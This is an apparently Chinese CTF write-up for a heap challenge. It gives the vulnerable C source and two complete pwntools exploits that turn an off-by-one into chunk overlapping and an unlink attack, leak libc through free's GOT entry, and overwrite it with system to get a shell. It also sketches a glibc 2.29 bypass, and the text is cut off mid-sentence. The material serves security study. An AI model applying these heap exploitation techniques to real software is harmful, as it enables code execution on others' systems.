  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;THE SONG DOESN&#x27;T EXIST!&quot;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">listen</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123; <br>  <span class="hljs-keyword">char</span> buf[<span class="hljs-number">4</span>];<br>  <span class="hljs-keyword">int</span> idx;<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;INDEX :&quot;</span>);<br>  read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">4</span>);<br>  idx = atoi(buf);<br>  <span class="hljs-keyword">if</span> (idx &lt; <span class="hljs-number">0</span> || idx &gt; <span class="hljs-number">100</span>) <br>  &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;INVALID INDEX!!!&quot;</span>);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>  &#125;<br>  <span class="hljs-keyword">if</span> (songlist[idx])<br>  &#123;<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;YOU ARE LINTENING TO %s &quot;</span>,songlist[idx]-&gt;name);<br>  &#125;  <br>  <span class="hljs-keyword">else</span><br>    &#123;<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;THE SONG DOESN&#x27;T EXIST!&quot;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">edit</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123; <br>  <span class="hljs-keyword">char</span> buf[<span class="hljs-number">8</span>];<br>  <span class="hljs-keyword">int</span> idx;<br>  <span class="hljs-keyword">size_t</span> size;<br><br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;NOW YOU CAN CHANGE YOUR SONG&#x27;S NAME!!&quot;</span>);<br><br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;INDEX OF YOUR TERGGER SONG: &quot;</span>);<br>  <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>,&amp;idx);<br>  <span class="hljs-keyword">if</span>(idx &lt; <span class="hljs-number">0</span> || idx &gt; <span class="hljs-number">100</span>)<br>    &#123;<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;INVALID INDEX!!!&quot;</span>);<br>      <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;SIZE OF THE SONG :&quot;</span>);<br>    read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">8</span>);<br>    size = atoi(buf);<br>    songlist[idx]-&gt;name = (<span class="hljs-keyword">char</span> *)<span class="hljs-built_in">malloc</span>(size);<span class="hljs-comment">//add a chunk to store the struct &#x27;size&#x27; .</span><br>    <span class="hljs-keyword">if</span> (!songlist[idx]-&gt;name) <br>    &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;ALLOCA ERROR&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<span class="hljs-comment">//error</span><br>    <span class="hljs-keyword">if</span> (songlist[idx]) <br>    &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;CHANGE YOUR SONG NAME NOW :&quot;</span>);<br>    read(<span class="hljs-number">0</span>,songlist[idx]-&gt;name,size+<span class="hljs-number">1</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;EDIT SUCCESFULLY&quot;</span>); <br>    &#125; <br>    <span class="hljs-keyword">else</span><br>      &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;THE SONG DOESN&#x27;T EXIST!&quot;</span>);<br>      &#125;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123; <span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>;<br>  setvbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>);<br>  setvbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>);<br>  <span class="hljs-keyword">char</span> buf[<span class="hljs-number">4</span>];<br>  <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>)<br>  &#123;<br>    menu();<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;YOUR CHOISE :&quot;</span>);<br>    read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">4</span>);<br>    <span class="hljs-comment">//scanf(&quot;%d&quot;,&amp;i);</span><br>    <span class="hljs-keyword">switch</span> (atoi(buf))<br>    &#123;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>      download();<br>      sleep(<span class="hljs-number">1</span>);<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>      <span class="hljs-keyword">delete</span>();<br>      sleep(<span class="hljs-number">1</span>);<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">3</span>:<br>      listen();<br>      sleep(<span class="hljs-number">1</span>);<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">4</span>:<br>      edit();<br>      sleep(<span class="hljs-number">1</span>);<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">5</span>:<br>      <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>      sleep(<span class="hljs-number">1</span>);<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">6</span>:<br>      <span class="hljs-keyword">for</span>(i;i&lt;<span class="hljs-number">20</span>;i++)<br>      &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;?????\n&quot;</span>);<br>        sleep(<span class="hljs-number">1</span>);<br>      &#125;<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">default</span>:<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;INVALID CHOISE!!!&quot;</span>);<br>      <span class="hljs-keyword">break</span>;<br>    &#125;<br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="3）解题分析"><a href="#3）解题分析" class="headerlink" title="3）解题分析"></a>3）解题分析</h2><h3 id="1）漏洞点分析"><a href="#1）漏洞点分析" class="headerlink" title="1）漏洞点分析"></a>1）漏洞点分析</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">rin@fur1n:~/pwn$ checksec summer<br>[*] <span class="hljs-string">&#x27;/home/rin/pwn/summer&#x27;</span><br>    Arch:     amd64-64-little<br>    RELRO:    NO RELRO<br>    Stack:    Canary found<br>    NX:       NX enabled<br>    PIE:      NO PIE <br></code></pre></td></tr></table></figure><p>无pie，无relro</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;NAME :&quot;</span>);<br>      read(<span class="hljs-number">0</span>, **((<span class="hljs-keyword">void</span> ***)&amp;songlist + i), size + <span class="hljs-number">1</span>);<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;DOWNLOAD SUCCESFULLY&quot;</span>);<br></code></pre></td></tr></table></figure><p>一个很直观的漏洞点，read的时候会比原本规定的多读入一个字节，造成off by one。</p><h3 id="2）漏洞利用分析"><a href="#2）漏洞利用分析" class="headerlink" title="2）漏洞利用分析"></a>2）漏洞利用分析</h3><p>这种堆题一个比较经典的思路就是悬垂指针的利用。利用fake chunk来修改指针造成任意地址写。但众所周知，在2.26后的对于prev_size的检测为无脑chunk overlapping增加了难度。所以这里分别将程序以libc2.23和libc2.27，2.29执行，并且分别分析对应的漏洞利用。</p><h4 id="1-level0-baby-overlapping"><a href="#1-level0-baby-overlapping" class="headerlink" title="1)  level0-baby_overlapping"></a>1)  level0-baby_overlapping</h4><p>既然是单字节溢出，我们可以考虑修改chunk 的<code>prev_size</code>位后，控制这个chunk的指针，将它劫持到free或者show的got表地址然后leak libc基址。</p><p>核心利用思路与ctf wiki关于chunk overlapping上面的示例5一样。</p><p>申请两个chunk，然后编辑chunk0，利用off by one覆盖chunk1的<code>prev_size</code>位，然后释放chunk1，由于悬垂指针，我们可以重新add一个0x40大小的chunk1，用free的got表的地址覆盖指向chunk1的指针，再利用<code>show（1）</code>功能打印将它出来，这就完成了内存泄露。</p><p>然后利用free的真实地址进而计算出system的真实地址，继而在free的got的位置将free的got表值覆盖为system的地址，通过之前构造的chunk1的content中的<code>&quot;/bin/sh&quot;</code>进行系统调用并getshell。</p><p>exp如下。具体的细节说明在注释中。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.terminal = [<span class="hljs-string">&quot;tmux&quot;</span>, <span class="hljs-string">&quot;splitw&quot;</span>, <span class="hljs-string">&quot;-h&quot;</span>]<br>r = process([<span class="hljs-string">&quot;./glibc/lib00/lib/x86_64-linux-gnu/ld-2.23.so&quot;</span>, <span class="hljs-string">&quot;./summer_1&quot;</span>],env=&#123;<span class="hljs-string">&quot;LD_PRELOAD&quot;</span>:<span class="hljs-string">&quot;./glibc/lib00/lib/x86_64-linux-gnu/libc.so.6&quot;</span>&#125;)<span class="hljs-comment">#switch the verion of libc</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>libc = ELF(<span class="hljs-string">&#x27;./glibc/lib00/lib/x86_64-linux-gnu/libc-2.23.so&#x27;</span>)<br>elf  = ELF(<span class="hljs-string">&#x27;./summer_1&#x27;</span>)<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">size,content</span>):</span><br>  r.sendline(<span class="hljs-string">&quot;1&quot;</span>)<br>  r.sendafter(<span class="hljs-string">&quot;:&quot;</span>,<span class="hljs-built_in">str</span>(size))<br>  r.sendafter(<span class="hljs-string">&quot;:&quot;</span>,content)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">delete</span>(<span class="hljs-params">idx</span>):</span><br>  r.sendline(<span class="hljs-string">&quot;2&quot;</span>)<br>  r.sendafter(<span class="hljs-string">&quot;:&quot;</span>,<span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span>(<span class="hljs-params">idx</span>):</span><br>  r.sendline(<span class="hljs-string">&quot;3&quot;</span>)<br>  r.sendafter(<span class="hljs-string">&quot;:&quot;</span>,<span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span>(<span class="hljs-params">idx,content</span>):</span><br>  r.sendline(<span class="hljs-string">&quot;4&quot;</span>)<br>  r.sendafter(<span class="hljs-string">&quot;:&quot;</span>,<span class="hljs-built_in">str</span>(idx))<br>  r.sendafter(<span class="hljs-string">&quot;:&quot;</span>,<span class="hljs-built_in">str</span>(content))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">dbg</span>():</span><br>  gdb.attach(r)<br>  pause()<br><br>free_got = <span class="hljs-number">0x4036E8</span> <br><br>add(<span class="hljs-number">0x18</span>, <span class="hljs-string">b&quot;aaaa&quot;</span>)  <span class="hljs-comment"># chunk0</span><br>add(<span class="hljs-number">0x10</span>, <span class="hljs-string">b&quot;bbbb&quot;</span>)  <span class="hljs-comment"># chunk1</span><br>edit(<span class="hljs-number">0</span>, <span class="hljs-string">b&quot;/bin/sh\x00&quot;</span> + <span class="hljs-string">b&quot;a&quot;</span> * <span class="hljs-number">0x10</span> + <span class="hljs-string">b&quot;\x41&quot;</span>)<br><span class="hljs-comment">#construct thestruction of chunk0 for the application later.</span><br><span class="hljs-comment">#Especially the str(&#x27;/bin/sh&#x27;)to trigger the system execve()</span><br><span class="hljs-comment">#dbg()</span><br><br>delete(<span class="hljs-number">1</span>)<span class="hljs-comment">#free chunk1,then the 41 will become the size of chunk1</span><br>add(<span class="hljs-number">0x20</span>, p64(<span class="hljs-number">0</span>) * <span class="hljs-number">4</span> + p64(<span class="hljs-number">0x20</span>) + p64(elf.got[<span class="hljs-string">&#x27;free&#x27;</span>])) <br><span class="hljs-comment">#overlap the chunk1</span><br>show(<span class="hljs-number">1</span>) <br><br>free_addr = u64(r.recvuntil(<span class="hljs-string">&quot;DOWNLOAD SUCCESFULLY&quot;</span>)[:-<span class="hljs-number">5</span>].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&quot;\x00&quot;</span>))<br>libc_base = free_addr - libc.symbols[<span class="hljs-string">&#x27;free&#x27;</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(libc_base))<br>system_addr = libc_base + libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br><span class="hljs-comment">#leak</span><br><br>edit(<span class="hljs-number">1</span>, p64(system_addr))<br><br>show(<span class="hljs-number">1</span>)<br>delete(<span class="hljs-number">0</span>)<br><br>r.interactive()<br><br></code></pre></td></tr></table></figure><h4 id="2）level1-eazy-unlink"><a href="#2）level1-eazy-unlink" class="headerlink" title="2）level1-eazy_unlink"></a>2）level1-eazy_unlink</h4><p>虽然直接修改prevsize位造成堆叠非常简单，但是我们也可以利用unlink中的思路，在chunk中构造fakechunk，通过off by one/null 触发unlink造成堆叠。这并不是特地绕远路，在level2中我们无法直接单字节溢出，必须用到ulnink。</p><p>那为什么利用unlink能构造堆叠呢？<strong>详见extra。</strong></p><p>构造出堆叠以后的利用就相对模版化，因为保护同样还是只有nx和canary，我们可以很方便地同无保护的堆叠一样修改chunk的指针为<code>free</code>的got表地址来泄露程序的内存布局，然后再用system的got表值把<code>free</code>的got表值覆盖。</p><p>具体的细节分析如下。</p><h5 id="1）堆风水构造"><a href="#1）堆风水构造" class="headerlink" title="1）堆风水构造"></a>1）堆风水构造</h5><p><del>ps：程序会先分配一个0x20的chunk储存size。但是效果是一样的</del></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">add(<span class="hljs-number">0xf8</span>,<span class="hljs-string">b&#x27;aaaa&#x27;</span>)<span class="hljs-comment">#chunk0，用来写system的参数</span><br>add(<span class="hljs-number">0xf8</span>,<span class="hljs-string">b&#x27;bbbb&#x27;</span>)<span class="hljs-comment">#chunk1#在其中伪造fake chunk</span><br>add(<span class="hljs-number">0xf8</span>,<span class="hljs-string">b&#x27;cccc&#x27;</span>)<span class="hljs-comment">#chunk2#触发unlink</span><br>add(<span class="hljs-number">0xf8</span>,<span class="hljs-string">b&#x27;dddd&#x27;</span>)<span class="hljs-comment">#chunk3,用来防止free chunk 与 top chunk 合并</span><br></code></pre></td></tr></table></figure><p>连续申请4个chunk，大小都是0xf8。</p><p>0xf8这个数字的来源如何？</p><p>分配0xf8的content，实际在内存中是0x101。 为什么是0x101？ 首先我们要实现空字节溢出，一般来说是溢出一个<code>/x00</code>。如果chunk的size过小，先不说free以后分配的chunk的种类，单是空字节溢出也会使得size变成0，这里只有当原本的size是三位数的时候溢出才有意义。 其次还涉及到prec size的在内存的位置问题。</p><p><strong>详细分析参见exrta。</strong></p><h5 id="2）利用off-by-null-进行unlink"><a href="#2）利用off-by-null-进行unlink" class="headerlink" title="2）利用off by null 进行unlink"></a>2）利用off by null 进行unlink</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python">payload = p64(<span class="hljs-number">0x110</span>)<span class="hljs-comment">#prev_size</span><br>payload += p64(<span class="hljs-number">0xf1</span>)<span class="hljs-comment">#size</span><br>payload += p64(next_chunk_addr - <span class="hljs-number">0x18</span>)<span class="hljs-comment">#fd</span><br>payload += p64(next_chunk_addr - <span class="hljs-number">0x10</span>)<span class="hljs-comment">#bk</span><br>payload += <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0xd0</span><span class="hljs-comment">#堆的大小减去伪造的heap头，0x100-0x8*5</span><br>payload += p64(<span class="hljs-number">0xf0</span>)<span class="hljs-comment">#next_prev_size，利用了off by null的单字节溢出</span><br>edit(<span class="hljs-number">1</span>,payload)<br>delete(<span class="hljs-number">2</span>)<span class="hljs-comment">#触发unlink、，造成堆叠</span><br></code></pre></td></tr></table></figure><p>这里开始进行unlink操作。</p><p>首先确定fd，bk地址。确定地址的思路事实上就是之前提到过的，extra部分中对于unlink利用的概述。</p><p>所以我们使用的是next_chunk_addr - 0x18/0x10。</p><p>Nextchunk addr的地址则是chunk2 ptr。可以通过调试得到具体的值即0x6024b0</p><p>并且我们通过空字节溢出使得next chunk的prev size位为F0，它将prev inuse改成了00，使得程序认为chunk1是一个free chunk，当我们释放chunk2，就会触发chunk1的unlink。</p><p>而且根据unlink的原理，这段exp使得这个fake chunk的地址向下减少了0x18.(ps:64bit下）</p><p>意味着chunk1已经和chunk2形成了堆叠。</p><p><strong>具体还是参见extra</strong></p><p>堆叠的形成意味着我们可以通过更改chunk1的内容改变它的指针。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">payload1</span> = p<span class="hljs-number">64</span>(<span class="hljs-number">0</span>xf<span class="hljs-number">8</span>)#size<br><span class="hljs-attribute">payload1</span> = p<span class="hljs-number">64</span>(free_got_addr)#利用堆叠更改chunk<span class="hljs-number">1</span>的指针<br><span class="hljs-attribute">edit</span>(<span class="hljs-number">1</span>,payload<span class="hljs-number">1</span>）<br><span class="hljs-attribute">show</span>（<span class="hljs-number">1</span>）#此时打印出chunk<span class="hljs-number">1</span>的内容，即为free的真实地址<br></code></pre></td></tr></table></figure><h5 id="3）完整exp："><a href="#3）完整exp：" class="headerlink" title="3）完整exp："></a>3）完整exp：</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><code class="hljs python"><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><br>context.terminal = [<span class="hljs-string">&quot;tmux&quot;</span>, <span class="hljs-string">&quot;splitw&quot;</span>, <span class="hljs-string">&quot;-h&quot;</span>]<br>r = process([<span class="hljs-string">&quot;./glibc/lib00/lib/x86_64-linux-gnu/ld-2.23.so&quot;</span>, <span class="hljs-string">&quot;./summer_1&quot;</span>],env=&#123;<span class="hljs-string">&quot;LD_PRELOAD&quot;</span>:<span class="hljs-string">&quot;./glibc/lib00/lib/x86_64-linux-gnu/libc.so.6&quot;</span>&#125;)<span class="hljs-comment">#switch the verion of libc</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>libc = ELF(<span class="hljs-string">&#x27;./glibc/lib00/lib/x86_64-linux-gnu/libc-2.23.so&#x27;</span>)<br>elf  = ELF(<span class="hljs-string">&#x27;./summer_1&#x27;</span>)<br><br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">size,content</span>):</span><br>  r.recvuntil(<span class="hljs-string">&quot;:&quot;</span>)<br>  r.sendline(<span class="hljs-string">&quot;1&quot;</span>)<br>  r.sendlineafter(<span class="hljs-string">&quot;:&quot;</span>,<span class="hljs-built_in">str</span>(size))<br>  r.sendlineafter(<span class="hljs-string">&quot;:&quot;</span>,content)<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">delete</span>(<span class="hljs-params">idx</span>):</span><br>  r.recvuntil(<span class="hljs-string">&quot;:&quot;</span>)<br>  r.sendline(<span class="hljs-string">&quot;2&quot;</span>)<br>  r.sendlineafter(<span class="hljs-string">&quot;:&quot;</span>,<span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span>(<span class="hljs-params">idx</span>):</span><br>  r.recvuntil(<span class="hljs-string">&quot;:&quot;</span>)<br>  r.sendline(<span class="hljs-string">&quot;3&quot;</span>)<br>  r.sendlineafter(<span class="hljs-string">&quot;:&quot;</span>,<span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span>(<span class="hljs-params">idx,content</span>):</span><br>  r.recvuntil(<span class="hljs-string">&quot;:&quot;</span>)<br>  r.sendline(<span class="hljs-string">&quot;4&quot;</span>)<br>  r.sendlineafter(<span class="hljs-string">&quot;:&quot;</span>,<span class="hljs-built_in">str</span>(idx))<br>  r.sendlineafter(<span class="hljs-string">&quot;:&quot;</span>,<span class="hljs-built_in">str</span>(content))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">dbg</span>():</span><br>  gdb.attach(r)<br>  pause()<br><br>unlink_addr = <span class="hljs-number">0x6024b0</span><br>free_got_addr = <span class="hljs-number">0x4036E8</span><br>next_chunk_addr = unlink_addr<br><br>add(<span class="hljs-number">0xf8</span>,<span class="hljs-string">b&#x27;aaaa&#x27;</span>)<span class="hljs-comment">#chunk0，用来写system的参数</span><br>add(<span class="hljs-number">0xf8</span>,<span class="hljs-string">b&#x27;bbbb&#x27;</span>)<span class="hljs-comment">#chunk1#在其中伪造fake chunk</span><br>add(<span class="hljs-number">0xf8</span>,<span class="hljs-string">b&#x27;cccc&#x27;</span>)<span class="hljs-comment">#chunk2#触发unlink</span><br>add(<span class="hljs-number">0xf8</span>,<span class="hljs-string">b&#x27;dddd&#x27;</span>)<span class="hljs-comment">#chunk3,用来防止free chunk 与 top chunk 合并</span><br><br><br>payload = p64(<span class="hljs-number">0x100</span>)<span class="hljs-comment">#prev_size</span><br>payload += p64(<span class="hljs-number">0xf1</span>)<span class="hljs-comment">#size</span><br>payload += p64(next_chunk_addr - <span class="hljs-number">0x18</span>)<span class="hljs-comment">#fd</span><br>payload += p64(next_chunk_addr - <span class="hljs-number">0x10</span>)<span class="hljs-comment">#bk</span><br>payload += <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0xd0</span><span class="hljs-comment">#堆的大小减去伪造的heap头，0x110-0x8*5</span><br>payload += <span class="hljs-string">b&#x27;0xf0&#x27;</span><span class="hljs-comment">#next_prev_size</span><br>edit(<span class="hljs-number">1</span>,payload)<br>delete(<span class="hljs-number">2</span>)<span class="hljs-comment">#触发unlink，造成堆叠</span><br><br>payload1 = p64(<span class="hljs-number">0xf8</span>)<span class="hljs-comment">#size</span><br>payload1 += p64(free_got_addr)<span class="hljs-comment">#利用堆叠更改chunk1的指针为free的got表</span><br>edit(<span class="hljs-number">1</span>,payload1)<br>show(<span class="hljs-number">1</span>)<span class="hljs-comment">#此时打印出chunk1的内容，即为free的真实地址</span><br><br><span class="hljs-comment">#leak</span><br>free_addr = u64(r.recvuntil(<span class="hljs-string">&quot;DOWNLOAD SUCCESFULLY&quot;</span>)[:-<span class="hljs-number">5</span>].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&quot;\x00&quot;</span>))<br>libc_base = free_addr - libc.symbols[<span class="hljs-string">&#x27;free&#x27;</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(libc_base))<br>system_addr = libc_base + libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br><br>edit(<span class="hljs-number">1</span>,p64(system_addr))<span class="hljs-comment">#更改free的got表值为system函数的真实地址</span><br>edit(<span class="hljs-number">0</span>,<span class="hljs-string">&quot;/bin/sh\x00&quot;</span>)<span class="hljs-comment">#将chunk0的内容填充为binsh，作为下面执行函数的参数</span><br>delete(<span class="hljs-number">0</span>)<span class="hljs-comment">#由于free的got表值已经被篡改为system，所以调用free即调用system。</span><br><br>r.interactive()<br></code></pre></td></tr></table></figure><h4 id="3）level2-harder-unlink"><a href="#3）level2-harder-unlink" class="headerlink" title="3）level2-harder_unlink"></a>3）level2-harder_unlink</h4><p>2.29以后glibc代码中增加了对于prev_size的检测</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* consolidate backward */</span><br><span class="hljs-keyword">if</span> (!prev_inuse(p)) &#123;<br>    prevsize = prev_size (p);<br>    size += prevsize;<br>    p = chunk_at_offset(p, -((<span class="hljs-keyword">long</span>) prevsize));<br>    <span class="hljs-keyword">if</span> (__glibc_unlikely (chunksize(p) != prevsize))<br>        malloc_printerr (<span class="hljs-string">&quot;corrupted size vs. prev_size while consolidating&quot;</span>);<br>    unlink_chunk (av, p);<br>&#125;<br></code></pre></td></tr></table></figure><p>来对抗单字节溢出。</p><p>检测的内容也很好理解，如果当chunk的<code>size</code>位如果与next chunk的<code>prev_size</code>位不相等即报错。这个检测使我们很难直接通过单字节溢出来控制prev size位。</p><p>那么我们应该如何绕过它呢？</p><p>很自然地我们想到可以更改next chunk的<code>prev_size</code>，但是仔细想想就会发现这是个无尽套娃。基本不可能。</p><p>既然想不出简单的办法绕过，那我们就干脆不修改<code>prev_size</code>了。</p><p>一般的poison null byte是通过伪造fd和bk位来伪造fake chunk的地址，使得地址向低地址移动，既然现在不好控制，那么如果内存上有现成的fd和bk供我们利用呢？我们是不是可以利用它们来控制fake chunk—-确有其事，比如说largebin chunk的<code>fd_nextsize</code>,<code>bk_nextsize</code>。</p><p>我们可以以<code>fd_nextsize</code>作为fake chunk的fd，<code>bk_nextsize</code>作为fake chunk的bk。</p><p>由于<code>fd_nextsize</code>和<code>bk_nextsize</code>用于指向第一个与自己大小不同的chunk，当largebin中只有一个chunk，这两个指针都是指向chunk本身。</p><p><strong>具体见extra部分中对于largebin的概述。</strong></p><p>利用方式则是：</p><ol><li><p>申请两个较大的chunk后再释放，要求chunk进入unsorted bin。</p></li><li><p>将一个largebin申请回来。</p></li><li><p>在这个largebin chunkA内构造fake。在原本chunkA的bk位置写fake 